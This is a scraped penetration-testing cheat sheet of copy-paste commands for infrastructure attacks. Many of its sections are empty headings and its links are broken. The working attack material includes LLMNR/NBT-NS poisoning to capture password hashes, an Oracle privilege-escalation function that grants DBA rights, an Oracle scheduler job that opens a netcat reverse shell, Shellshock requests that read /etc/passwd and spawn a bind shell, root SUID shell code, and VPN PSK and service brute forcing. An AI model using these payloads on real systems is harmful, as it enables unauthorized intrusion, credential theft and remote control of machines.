# Penetration Testing Tools Cheat Sheet

### Introduction <a href="#introduction" id="introduction"></a>

**Penetration testing tools cheat sheet**, a quick reference high level overview for typical penetration testing engagements. Designed as a quick reference cheat sheet providing a high level overview of the **typical** commands [a third-party pen test company](https://www.aptive.co.uk/penetration-testing/) would run when performing a manual infrastructure penetration test. For more in depth information I’d recommend the man file for the tool or a more specific pen testing cheat sheet from the menu on the right.

The focus of this cheat sheet is infrastructure / network penetration testing, web application penetration testing is not covered here apart from a few sqlmap commands at the end and some web server enumeration. For Web Application Penetration Testing, check out the Web Application Hackers Hand Book, it is excellent for both learning and reference.

If I’m missing any pen testing tools here give me a nudge on twitter.

#### Changelog <a href="#changelog" id="changelog"></a>

16/09/2020 - fixed some formatting issues (more coming soon I promise). 17/02/2017 - Article updated, added loads more content, VPN, DNS tunneling, VLAN hopping etc - check out the TOC below.

* [Introduction](broken-reference)
  * [Changelog](broken-reference)
* [Pre-engagement](broken-reference)
  * [Network Configuration](broken-reference)
    * [Set IP Address](broken-reference)
    * [Subnetting](broken-reference)
* [OSINT](broken-reference)
  * [Passive Information Gathering](broken-reference)
    * [DNS](broken-reference)
      * [WHOIS enumeration](broken-reference)
      * [Perform DNS IP Lookup](broken-reference)
      * [Perform MX Record Lookup](broken-reference)
      * [Perform Zone Transfer with DIG](broken-reference)
* [DNS Zone Transfers](broken-reference)
  * [Email](broken-reference)
    * [Simply Email](broken-reference)
  * [Semi Active Information Gathering](broken-reference)
    * [Basic Finger Printing](broken-reference)
    * [Banner grabbing with NC](broken-reference)
  * [Active Information Gathering](broken-reference)
    * [DNS Bruteforce](broken-reference)
      * [DNSRecon](broken-reference)
    * [Port Scanning](broken-reference)
      * [Nmap Commands](broken-reference)
        * [Nmap UDP Scanning](broken-reference)
        * [UDP Protocol Scanner](broken-reference)
        * [Other Host Discovery](broken-reference)
* [Enumeration & Attacking Network Services](broken-reference)
  * [SAMB / SMB / Windows Domain Enumeration](broken-reference)
    * [Samba Enumeration](broken-reference)
      * [SMB Enumeration Tools](broken-reference)
      * [Fingerprint SMB Version](broken-reference)
      * [Find open SMB Shares](broken-reference)
      * [Enumerate SMB Users](broken-reference)
      * [Manual Null session testing:](broken-reference)
      * [NBTScan unixwiz](broken-reference)
  * [LLMNR / NBT-NS Spoofing](broken-reference)
    * [Metasploit LLMNR / NetBIOS requests](broken-reference)
    * [Responder.py](broken-reference)
  * [SNMP Enumeration Tools](broken-reference)
    * [SNMPv3 Enumeration Tools](broken-reference)
  * [R Services Enumeration](broken-reference)
    * [RSH Enumeration](broken-reference)
      * [RSH Run Commands](broken-reference)
      * [Metasploit RSH Login Scanner](broken-reference)
      * [rusers Show Logged in Users](broken-reference)
      * [rusers scan whole Subnet](broken-reference)
  * [Finger Enumeration](broken-reference)
    * [Finger a Specific Username](broken-reference)
    * [Solaris bug that shows all logged in users:](broken-reference)
  * [rwho](broken-reference)
* [TLS & SSL Testing](broken-reference)
  * [testssl.sh](broken-reference)
* [Vulnerability Assessment](broken-reference)
* [Database Penetration Testing](broken-reference)
  * [Oracle](broken-reference)
    * [Fingerprint Oracle TNS Version](broken-reference)
    * [Brute force oracle user accounts](broken-reference)
    * [Oracle Privilege Escalation](broken-reference)
      * [Identify default accounts within oracle db using NMAP NSE scripts:](broken-reference)
      * [How to identify the current privilege level for an oracle user:](broken-reference)
      * [Oracle priv esc and obtain DBA access:](broken-reference)
      * [Run the exploit with a select query:](broken-reference)
      * [Remove the exploit using:](broken-reference)
      * [Get Oracle Reverse os-shell:](broken-reference)
  * [MSSQL](broken-reference)
    * [Bruteforce MSSQL Login](broken-reference)
    * [Metasploit MSSQL Shell](broken-reference)
* [Network](broken-reference)
  * [Plink.exe Tunnel](broken-reference)
  * [Pivoting](broken-reference)
    * [SSH Pivoting](broken-reference)
    * [Meterpreter Pivoting](broken-reference)
  * [TTL Finger Printing](broken-reference)
  * [IPv4 Cheat Sheets](broken-reference)
    * [Classful IP Ranges](broken-reference)
    * [IPv4 Private Address Ranges](broken-reference)
    * [IPv4 Subnet Cheat Sheet](broken-reference)
  * [VLAN Hopping](broken-reference)
  * [VPN Pentesting Tools](broken-reference)
    * [IKEForce](broken-reference)
    * [IKE Aggressive Mode PSK Cracking](broken-reference)
      * [Step 1: Idenitfy IKE Servers](broken-reference)
      * [Step 2: Enumerate group name with IKEForce](broken-reference)
      * [Step 3: Use ike-scan to capture the PSK hash](broken-reference)
      * [Step 4: Use psk-crack to crack the PSK hash](broken-reference)
    * [PPTP Hacking](broken-reference)
      * [NMAP PPTP Fingerprint:](broken-reference)
      * [PPTP Dictionary Attack](broken-reference)
  * [DNS Tunneling](broken-reference)
    * [Attacking Machine](broken-reference)
* [BOF / Exploit](broken-reference)
* [Exploit Research](broken-reference)
  * [Searching for Exploits](broken-reference)
  * [Compiling Windows Exploits on Kali](broken-reference)
  * [Cross Compiling Exploits](broken-reference)
  * [Exploiting Common Vulnerabilities](broken-reference)
    * [Exploiting Shellshock](broken-reference)
      * [cat file (view file contents)](broken-reference)
      * [Shell Shock run bind shell](broken-reference)
      * [Shell Shock reverse Shell](broken-reference)
* [Simple Local Web Servers](broken-reference)
* [Mounting File Shares](broken-reference)
* [HTTP / HTTPS Webserver Enumeration](broken-reference)
* [Packet Inspection](broken-reference)
* [Username Enumeration](broken-reference)
  * [SMB User Enumeration](broken-reference)
  * [SNMP User Enumeration](broken-reference)
* [Passwords](broken-reference)
  * [Wordlists](broken-reference)
* [Brute Forcing Services](broken-reference)
  * [Hydra FTP Brute Force](broken-reference)
  * [Hydra POP3 Brute Force](broken-reference)
  * [Hydra SMTP Brute Force](broken-reference)
* [Password Cracking](broken-reference)
  * [John The Ripper - JTR](broken-reference)
* [Windows Penetration Testing Commands](broken-reference)
* [Linux Penetration Testing Commands](broken-reference)
* [Compiling Exploits](broken-reference)
  * [Identifying if C code is for Windows or Linux](broken-reference)
  * [Build Exploit GCC](broken-reference)
  * [GCC Compile 32Bit Exploit on 64Bit Kali](broken-reference)
  * [Compile Windows .exe on Linux](broken-reference)
* [SUID Binary](broken-reference)
  * [SUID C Shell for /bin/bash](broken-reference)
  * [SUID C Shell for /bin/sh](broken-reference)
  * [Building the SUID Shell binary](broken-reference)
* [Reverse Shells](broken-reference)
* [TTY Shells](broken-reference)
  * [Python TTY Shell Trick](broken-reference)
  * [Spawn Interactive sh shell](broken-reference)
  * [Spawn Perl TTY Shell](broken-reference)
  * [Spawn Ruby TTY Shell](broken-reference)
  * [Spawn Lua TTY Shell](broken-reference)
  * [Spawn TTY Shell from Vi](broken-reference)
  * [Spawn TTY Shell NMAP](broken-reference)
* [Metasploit Cheat Sheet](broken-reference)
  * [Meterpreter Payloads](broken-reference)
  * [Windows reverse meterpreter payload](broken-reference)
  * [Windows VNC Meterpreter payload](broken-reference)
  * [Linux Reverse Meterpreter payload](broken-reference)
* [Meterpreter Cheat Sheet](broken-reference)
* [Common Metasploit Modules](broken-reference)
  * [Remote Windows Metasploit Modules (exploits)](broken-reference)
  * [Local Windows Metasploit Modules (exploits)](broken-reference)
  * [Auxilary Metasploit Modules](broken-reference)
  * [Metasploit Powershell Modules](broken-reference)
  * [Post Exploit Windows Metasploit Modules](broken-reference)
* [ASCII Table Cheat Sheet](broken-reference)
* [CISCO IOS Commands](broken-reference)
* [Cryptography](broken-reference)
  * [Hash Lengths](broken-reference)
  * [Hash Examples](broken-reference)
* [SQLMap Examples](broken-reference)

### Pre-engagement <a href="#pre-engagement" id="pre-engagement"></a>

#### Network Configuration <a href="#network-configuration" id="network-configuration"></a>

**Set IP Address**

```
ifconfig eth0 xxx.xxx.xxx.xxx/24 
```

**Subnetting**

```
ipcalc xxx.xxx.xxx.xxx/24 
ipcalc xxx.xxx.xxx.xxx 255.255.255.0 
```

### OSINT <a href="#osint" id="osint"></a>

#### Passive Information Gathering <a href="#passive-information-gathering" id="passive-information-gathering"></a>

**DNS**

**WHOIS enumeration**

```
whois domain-name-here.com 
```

**Perform DNS IP Lookup**

```
dig a domain-name-here.com @nameserver 
```

**Perform MX Record Lookup**

```
dig mx domain-name-here.com @nameserver
```

**Perform Zone Transfer with DIG**

```
dig axfr domain-name-here.com @nameserver
```

### DNS Zone Transfers <a href="#dns-zone-transfers" id="dns-zone-transfers"></a>

**Email**

**Simply Email**

Use Simply Email to enumerate all the online places (github, target site etc), it works better if you use proxies or set long throttle times so google doesn’t think you’re a robot and make you fill out a Captcha.

```
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
```

Simply Email can verify the discovered email addresss after gathering.

#### Semi Active Information Gathering <a href="#semi-active-information-gathering" id="semi-active-information-gathering"></a>

**Basic Finger Printing**

Manual finger printing / banner grabbing.

```
nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
<enter>
```

#### Active Information Gathering <a href="#active-information-gathering" id="active-information-gathering"></a>

**DNS Bruteforce**

**DNSRecon**

DNS Enumeration Kali - DNSRecon

root:\~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml

**Port Scanning**

**Nmap Commands**

For more commands, see the Nmap cheat sheet (link in the menu on the right).

Basic Nmap Commands:

I’ve had a few people mention about T4 scans, apply common sense here. Don’t use T4 commands on external pen tests (when using an Internet connection), you’re probably better off using a T2 with a TCP connect scan. A T4 scan would likely be better suited for an internal pen test, over low latency links with plenty of bandwidth. But it all depends on the target devices, embeded devices are going to struggle if you T4 / T5 them and give inconclusive results. As a general rule of thumb, scan as slowly as you can, or do a fast scan for the top 1000 so you can start pen testing then kick off a slower scan.

**Nmap UDP Scanning**

**UDP Protocol Scanner**

```
git clone https://github.com/portcullislabs/udp-proto-scanner.git
```

Scan a file of IP addresses for all services:

```
./udp-protocol-scanner.pl -f ip.txt 
```

Scan for a specific UDP service:

```
udp-proto-scanner.pl -p ntp -f ips.txt
```

**Other Host Discovery**

Other methods of host discovery, that don’t use nmap…

### Enumeration & Attacking Network Services <a href="#enumeration--attacking-network-services" id="enumeration--attacking-network-services"></a>

Penetration testing tools that spefically identify and / or enumerate network services:

#### SAMB / SMB / Windows Domain Enumeration <a href="#samb--smb--windows-domain-enumeration" id="samb--smb--windows-domain-enumeration"></a>

**Samba Enumeration**

**SMB Enumeration Tools**

```
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

Also see, nbtscan cheat sheet (right hand menu).

**Fingerprint SMB Version**

```
smbclient -L //192.168.1.100 
```

**Find open SMB Shares**

```
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
```

**Enumerate SMB Users**

```
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
```

```
python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
```

RID Cycling:

```
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
```

Metasploit module for RID cycling:

```
use auxiliary/scanner/smb/smb_lookupsid
```

**Manual Null session testing:**

Windows:

```
net use \\TARGET\IPC$ "" /u:""
```

Linux:

```
smbclient -L //192.168.99.131
```

**NBTScan unixwiz**

Install on Kali rolling:

```
apt-get install nbtscan-unixwiz 
nbtscan-unixwiz -f 192.168.0.1-254 > nbtscan
```

#### LLMNR / NBT-NS Spoofing <a href="#llmnr--nbt-ns-spoofing" id="llmnr--nbt-ns-spoofing"></a>

Steal credentials off the network.

**Metasploit LLMNR / NetBIOS requests**

Spoof / poison LLMNR / NetBIOS requests:

```
auxiliary/spoof/llmnr/llmnr_response
auxiliary/spoof/nbns/nbns_response
```

Capture the hashes:

```
auxiliary/server/capture/smb
auxiliary/server/capture/http_ntlm
```

You’ll end up with NTLMv2 hash, use john or hashcat to crack it.

**Responder.py**

Alternatively you can use responder.

```
git clone https://github.com/SpiderLabs/Responder.git
python Responder.py -i local-ip -I eth0
```

**Run Responder.py for the whole engagement**

Run Responder.py for the length of the engagement while you're working on other attack vectors.

#### SNMP Enumeration Tools <a href="#snmp-enumeration-tools" id="snmp-enumeration-tools"></a>

A number of SNMP enumeration tools.

Fix SNMP output values so they are human readable:

```
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```

**SNMPv3 Enumeration Tools**

Idenitfy SNMPv3 servers with nmap:

```
nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
```

Rory McCune’s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:

```
apt-get install snmp snmp-mibs-downloader
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
```

**Use Metasploits Wordlist**

Metasploit's wordlist (KALI path below) has common credentials for v1 & 2 of SNMP, for newer credentials check out Daniel Miessler's SecLists project on GitHub (not the mailing list!).

```
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```

#### R Services Enumeration <a href="#r-services-enumeration" id="r-services-enumeration"></a>

This is legacy, included for completeness.

nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation:

**RSH Enumeration**

**RSH Run Commands**

**Metasploit RSH Login Scanner**

```
auxiliary/scanner/rservices/rsh_login
```

**rusers Show Logged in Users**

**rusers scan whole Subnet**

```
rlogin -l <user> <target>
```

e.g rlogin -l root TARGET-SUBNET/24

#### Finger Enumeration <a href="#finger-enumeration" id="finger-enumeration"></a>

**Finger a Specific Username**

**Solaris bug that shows all logged in users:**

```
finger [email protected]  

SunOS: RPC services allow user enum:
$ rusers # users logged onto LAN

finger 'a b c d e f g h'@sunhost 
```

#### rwho <a href="#rwho" id="rwho"></a>

Use nmap to identify machines running rwhod (513 UDP)

### TLS & SSL Testing <a href="#tls--ssl-testing" id="tls--ssl-testing"></a>

#### testssl.sh <a href="#testsslsh" id="testsslsh"></a>

Test all the things on a single host and output to a .html file:

```
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html  
```

### Vulnerability Assessment <a href="#vulnerability-assessment" id="vulnerability-assessment"></a>

Install OpenVAS 8 on Kali Rolling:

```
apt-get update
apt-get dist-upgrade -y
apt-get install openvas
openvas-setup
```

Verify openvas is running using:

Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup.

### Database Penetration Testing <a href="#database-penetration-testing" id="database-penetration-testing"></a>

Attacking database servers exposed on the network.

#### Oracle <a href="#oracle" id="oracle"></a>

Install oscanner:

Run oscanner:

```
oscanner -s 192.168.1.200 -P 1521 
```

**Fingerprint Oracle TNS Version**

Install tnscmd10g:

```
apt-get install tnscmd10g
```

Fingerprint oracle tns:

```
tnscmd10g version -h TARGET
nmap --script=oracle-tns-version 
```

**Brute force oracle user accounts**

Identify default Oracle accounts:

```
 nmap --script=oracle-sid-brute 
 nmap --script=oracle-brute 
```

Run nmap scripts against Oracle TNS:

**Oracle Privilege Escalation**

Requirements:

* Oracle needs to be exposed on the network
* A default account is in use like scott

Quick overview of how this works:

1. Create the function
2. Create an index on table SYS.DUAL
3. The index we just created executes our function SCOTT.DBA\_X
4. The function will be executed by SYS user (as that’s the user that owns the table).
5. Create an account with DBA priveleges

In the example below the user SCOTT is used but this should be possible with another default Oracle account.

**Identify default accounts within oracle db using NMAP NSE scripts:**

```
nmap --script=oracle-sid-brute 
nmap --script=oracle-brute 
```

Login using the identified weak account (assuming you find one).

**How to identify the current privilege level for an oracle user:**

```
SQL> select * from session_privs; 

SQL> CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
curren_user is 
pragma autonomous_transaction; 
begin 
execute immediate 'grant dba to user1 identified by pass1';
commit;
return 'FOO';
end;
```

**Oracle priv esc and obtain DBA access:**

Run netcat: `netcat -nvlp 443`code>

```
SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
```

**Run the exploit with a select query:**

```
SQL> Select * from session_privs; 
```

You should have a DBA user with creds user1 and pass1.

Verify you have DBA privileges by re-running the first command again.

**Remove the exploit using:**

**Get Oracle Reverse os-shell:**

```
begin
dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 
```

#### MSSQL <a href="#mssql" id="mssql"></a>

Enumeration / Discovery:

Nmap:

```
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
```

Metasploit:

```
msf > use auxiliary/scanner/mssql/mssql_ping
```

**Use MS SQL Servers Browse For More**

Try using "Browse for More" via MS SQL Server Management Studio

**Bruteforce MSSQL Login**

```
msf > use auxiliary/admin/mssql/mssql_enum
```

**Metasploit MSSQL Shell**

```
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

### Network <a href="#network" id="network"></a>

#### Plink.exe Tunnel <a href="#plinkexe-tunnel" id="plinkexe-tunnel"></a>

PuTTY Link tunnel

Forward remote port to local address:

```
plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
```

#### Pivoting <a href="#pivoting" id="pivoting"></a>

**SSH Pivoting**

Add socks4 127.0.0.1 1010 in /etc/proxychains.conf

SSH pivoting from one network to another:

Add socks4 127.0.0.1 1010 in /etc/proxychains.conf

Add socks4 127.0.0.1 1011 in /etc/proxychains.conf

**Meterpreter Pivoting**

#### TTL Finger Printing <a href="#ttl-finger-printing" id="ttl-finger-printing"></a>

#### IPv4 Cheat Sheets <a href="#ipv4-cheat-sheets" id="ipv4-cheat-sheets"></a>

**Classful IP Ranges**

E.g Class A,B,C (depreciated)

**IPv4 Private Address Ranges**

**IPv4 Subnet Cheat Sheet**

Subnet cheat sheet, not really realted to pen testing but a useful reference.

#### VLAN Hopping <a href="#vlan-hopping" id="vlan-hopping"></a>

Using NCCGroups VLAN wrapper script for Yersina simplifies the process.

```
git clone https://github.com/nccgroup/vlan-hopping.git
chmod 700 frogger.sh
./frogger.sh 
```

#### VPN Pentesting Tools <a href="#vpn-pentesting-tools" id="vpn-pentesting-tools"></a>

Identify VPN servers:

```
./udp-protocol-scanner.pl -p ike TARGET(s)

```

Scan a range for VPN servers:

```
./udp-protocol-scanner.pl -p ike -f ip.txt
```

**IKEForce**

Use IKEForce to enumerate or dictionary attack VPN servers.

Install:

```
pip install pyip
git clone https://github.com/SpiderLabs/ikeforce.git
```

Perform IKE VPN enumeration with IKEForce:

```
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
```

Bruteforce IKE VPN using IKEForce:

```
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
```

```
ike-scan
ike-scan TARGET-IP
ike-scan -A TARGET-IP
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
```

**IKE Aggressive Mode PSK Cracking**

1. Identify VPN Servers
2. Enumerate with IKEForce to obtain the group ID
3. Use ike-scan to capture the PSK hash from the IKE endpoint
4. Use psk-crack to crack the hash

**Step 1: Idenitfy IKE Servers**

```
./udp-protocol-scanner.pl -p ike SUBNET/24
```

**Step 2: Enumerate group name with IKEForce**

```
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
```

**Step 3: Use ike-scan to capture the PSK hash**

```
ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
```

**Step 4: Use psk-crack to crack the PSK hash**

Some more advanced psk-crack options below:

```
pskcrack
psk-crack -b 5 TARGET-IPkey
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary-file TARGET-IP-key
```

**PPTP Hacking**

Identifying PPTP, it listens on TCP: 1723

**NMAP PPTP Fingerprint:**

```
nmap –Pn -sV -p 1723 TARGET(S)
```

**PPTP Dictionary Attack**

```
thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
```

#### DNS Tunneling <a href="#dns-tunneling" id="dns-tunneling"></a>

Tunneling data over DNS to bypass firewalls.

dnscat2 supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.

**Attacking Machine**

Installtion:

```
apt-get update
apt-get -y install ruby-dev git make g++
gem install bundler
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
```

Run dnscat2:

```
ruby ./dnscat2.rb
dnscat2> New session established: 1422
dnscat2> session -i 1422
```

Target Machine:

https://downloads.skullsecurity.org/dnscat2/ https://github.com/lukebaggett/dnscat2-powershell/

```
dnscat --host <dnscat server_ip>
```

### BOF / Exploit <a href="#bof--exploit" id="bof--exploit"></a>

### Exploit Research <a href="#exploit-research" id="exploit-research"></a>

Find exploits for enumerated hosts / services.

#### Searching for Exploits <a href="#searching-for-exploits" id="searching-for-exploits"></a>

Install local copy of exploit-db:

```
 searchsploit –u
 searchsploit apache 2.2
 searchsploit "Linux Kernel"
 searchsploit linux 2.6 | grep -i ubuntu | grep local
```

#### Compiling Windows Exploits on Kali <a href="#compiling-windows-exploits-on-kali" id="compiling-windows-exploits-on-kali"></a>

```
  wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
  wine mingw-get-setup.exe
  select mingw32-base
  cd /root/.wine/drive_c/windows
  wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
  cd /root/.wine/drive_c/MinGW/bin
  wine gcc -o ability.exe /tmp/exploit.c -lwsock32
  wine ability.exe  
```

#### Cross Compiling Exploits <a href="#cross-compiling-exploits" id="cross-compiling-exploits"></a>

```
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
```

#### Exploiting Common Vulnerabilities <a href="#exploiting-common-vulnerabilities" id="exploiting-common-vulnerabilities"></a>

**Exploiting Shellshock**

A tool to find and exploit servers vulnerable to Shellshock:

```
git clone https://github.com/nccgroup/shocker
```

```
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
```

**cat file (view file contents)**

```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```

**Shell Shock run bind shell**

```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```

**Shell Shock reverse Shell**

### Simple Local Web Servers <a href="#simple-local-web-servers" id="simple-local-web-servers"></a>

Python local web server command, handy for serving up shells and exploits on an attacking machine.

How to mount NFS / CIFS, Windows and Linux file shares.

### HTTP / HTTPS Webserver Enumeration <a href="#http--https-webserver-enumeration" id="http--https-webserver-enumeration"></a>

### Packet Inspection <a href="#packet-inspection" id="packet-inspection"></a>

### Username Enumeration <a href="#username-enumeration" id="username-enumeration"></a>

Some techniques used to remotely enumerate users on a target system.

#### SMB User Enumeration <a href="#smb-user-enumeration" id="smb-user-enumeration"></a>

#### SNMP User Enumeration <a href="#snmp-user-enumeration" id="snmp-user-enumeration"></a>

### Passwords <a href="#passwords" id="passwords"></a>

#### Wordlists <a href="#wordlists" id="wordlists"></a>

### Brute Forcing Services <a href="#brute-forcing-services" id="brute-forcing-services"></a>

#### Hydra FTP Brute Force <a href="#hydra-ftp-brute-force" id="hydra-ftp-brute-force"></a>

#### Hydra POP3 Brute Force <a href="#hydra-pop3-brute-force" id="hydra-pop3-brute-force"></a>

#### Hydra SMTP Brute Force <a href="#hydra-smtp-brute-force" id="hydra-smtp-brute-force"></a>

Use `-t` to limit concurrent connections, example: `-t 15`

### Password Cracking <a href="#password-cracking" id="password-cracking"></a>

Password cracking penetration testing tools.

#### John The Ripper - JTR <a href="#john-the-ripper---jtr" id="john-the-ripper---jtr"></a>

### Windows Penetration Testing Commands <a href="#windows-penetration-testing-commands" id="windows-penetration-testing-commands"></a>

See **Windows Penetration Testing Commands**.

### Linux Penetration Testing Commands <a href="#linux-penetration-testing-commands" id="linux-penetration-testing-commands"></a>

See Linux Commands Cheat Sheet (right hand menu) for a list of Linux Penetration testing commands, useful for local system enumeration.

### Compiling Exploits <a href="#compiling-exploits" id="compiling-exploits"></a>

Some notes on compiling exploits.

#### Identifying if C code is for Windows or Linux <a href="#identifying-if-c-code-is-for-windows-or-linux" id="identifying-if-c-code-is-for-windows-or-linux"></a>

C #includes will indicate which OS should be used to build the exploit.

#### Build Exploit GCC <a href="#build-exploit-gcc" id="build-exploit-gcc"></a>

Compile exploit gcc.

#### GCC Compile 32Bit Exploit on 64Bit Kali <a href="#gcc-compile-32bit-exploit-on-64bit-kali" id="gcc-compile-32bit-exploit-on-64bit-kali"></a>

Handy for cross compiling 32 bit binaries on 64 bit attacking machines.

#### Compile Windows .exe on Linux <a href="#compile-windows-exe-on-linux" id="compile-windows-exe-on-linux"></a>

Build / compile windows exploits on Linux, resulting in a .exe file.

### SUID Binary <a href="#suid-binary" id="suid-binary"></a>

Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.

below are some quick copy and pate examples for various shells:

#### SUID C Shell for /bin/bash <a href="#suid-c-shell-for-binbash" id="suid-c-shell-for-binbash"></a>

```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}       
```

#### SUID C Shell for /bin/sh <a href="#suid-c-shell-for-binsh" id="suid-c-shell-for-binsh"></a>

```
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       
```

#### Building the SUID Shell binary <a href="#building-the-suid-shell-binary" id="building-the-suid-shell-binary"></a>

```
gcc -o suid suid.c  
```

For 32 bit:

```
gcc -m32 -o suid suid.c  
```

### Reverse Shells <a href="#reverse-shells" id="reverse-shells"></a>

See Reverse Shell Cheat Sheet for a list of useful Reverse Shells.

### TTY Shells <a href="#tty-shells" id="tty-shells"></a>

Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like `su` from reverse shells.

#### Python TTY Shell Trick <a href="#python-tty-shell-trick" id="python-tty-shell-trick"></a>

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
echo os.system('/bin/bash')
```

#### Spawn Interactive sh shell <a href="#spawn-interactive-sh-shell" id="spawn-interactive-sh-shell"></a>

```
/bin/sh -i
```

#### Spawn Perl TTY Shell <a href="#spawn-perl-tty-shell" id="spawn-perl-tty-shell"></a>

```
exec "/bin/sh";
perl —e 'exec "/bin/sh";'
```

#### Spawn Ruby TTY Shell <a href="#spawn-ruby-tty-shell" id="spawn-ruby-tty-shell"></a>

```
exec "/bin/sh"
```

#### Spawn Lua TTY Shell <a href="#spawn-lua-tty-shell" id="spawn-lua-tty-shell"></a>

```
os.execute('/bin/sh')
```

#### Spawn TTY Shell from Vi <a href="#spawn-tty-shell-from-vi" id="spawn-tty-shell-from-vi"></a>

Run shell commands from vi:

```
:!bash
```

#### Spawn TTY Shell NMAP <a href="#spawn-tty-shell-nmap" id="spawn-tty-shell-nmap"></a>

```
!sh
```

A basic metasploit cheat sheet that I have found handy for reference.

Basic Metasploit commands, useful for reference, for pivoting see - Meterpreter Pivoting techniques.

#### Meterpreter Payloads <a href="#meterpreter-payloads" id="meterpreter-payloads"></a>

#### Windows reverse meterpreter payload <a href="#windows-reverse-meterpreter-payload" id="windows-reverse-meterpreter-payload"></a>

#### Windows VNC Meterpreter payload <a href="#windows-vnc-meterpreter-payload" id="windows-vnc-meterpreter-payload"></a>

#### Linux Reverse Meterpreter payload <a href="#linux-reverse-meterpreter-payload" id="linux-reverse-meterpreter-payload"></a>

### Meterpreter Cheat Sheet <a href="#meterpreter-cheat-sheet" id="meterpreter-cheat-sheet"></a>

Useful meterpreter commands.

Top metasploit modules.

#### Remote Windows Metasploit Modules (exploits) <a href="#remote-windows-metasploit-modules-exploits" id="remote-windows-metasploit-modules-exploits"></a>

#### Local Windows Metasploit Modules (exploits) <a href="#local-windows-metasploit-modules-exploits" id="local-windows-metasploit-modules-exploits"></a>

#### Auxilary Metasploit Modules <a href="#auxilary-metasploit-modules" id="auxilary-metasploit-modules"></a>

#### Metasploit Powershell Modules <a href="#metasploit-powershell-modules" id="metasploit-powershell-modules"></a>

#### Post Exploit Windows Metasploit Modules <a href="#post-exploit-windows-metasploit-modules" id="post-exploit-windows-metasploit-modules"></a>

Windows Metasploit Modules for privilege escalation.

### ASCII Table Cheat Sheet <a href="#ascii-table-cheat-sheet" id="ascii-table-cheat-sheet"></a>

Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.

### CISCO IOS Commands <a href="#cisco-ios-commands" id="cisco-ios-commands"></a>

A collection of useful Cisco IOS commands.

### Cryptography <a href="#cryptography" id="cryptography"></a>

#### Hash Lengths <a href="#hash-lengths" id="hash-lengths"></a>

#### Hash Examples <a href="#hash-examples" id="hash-examples"></a>

Likely just use **hash-identifier** for this but here are some example hashes:

### SQLMap Examples <a href="#sqlmap-examples" id="sqlmap-examples"></a>

A mini SQLMap cheat sheet:
